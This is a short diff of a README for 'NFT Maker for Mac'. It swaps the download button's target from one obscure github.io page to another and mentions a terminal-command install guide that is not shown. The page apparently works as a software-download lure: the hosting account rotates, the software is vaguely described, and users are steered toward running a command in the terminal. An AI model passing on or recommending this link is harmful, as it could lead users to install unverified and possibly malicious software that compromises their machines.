@@ -3,7 +3,7 @@
 
 NFT Maker for Mac is a professional software 🎨 that allows users to create, design, and manage NFT collections effortlessly. Follow the instructions below to install NFT Maker on your Mac.
 
-[![Download NFT Maker For Mac](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://kamartamara.github.io/.github/nftmaker)
+[![Download NFT Maker For Mac](https://img.shields.io/badge/Download-Now-blueviolet?style=for-the-badge)](https://tayusikf8398.github.io/.github/nftmaker)
 
 If the download button doesn’t work, follow the installation guide below using the terminal command.
 
